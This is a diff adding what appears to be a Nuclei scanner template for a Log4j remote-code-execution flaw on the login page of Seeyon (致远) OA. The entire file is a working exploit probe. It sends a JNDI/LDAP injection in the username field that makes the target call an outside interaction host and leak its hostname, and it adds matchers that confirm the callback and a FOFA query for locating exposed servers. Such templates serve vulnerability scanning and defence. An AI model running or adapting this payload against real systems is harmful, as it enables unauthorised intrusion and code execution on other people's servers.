@@ -1,0 +1,43 @@
+id: poc-local-oa-seeyon-loginpanel-log4j-rce
+
+info:
+  name: 致远OA-登录页面-log4j-rce
+  author: capiton
+  severity: critical
+  description: 致远OA-登录页面-log4j-rce
+  reference:
+    - 
+  metadata:
+    fofa-query: app="致远互联-OA"
+    Vulnerability-Impact: unknown
+  tags: seeyon,zhiyuan
+
+requests:
+  - raw:
+      - |-
+        POST /seeyon/main.do?method=login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip,deflate
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        login_username=%24%7Bjndi%3Aldap%3A%2F%2F${hostName}.{{interactsh-url}}%2Faa%7D
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"  # Confirms the DNS Interaction
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
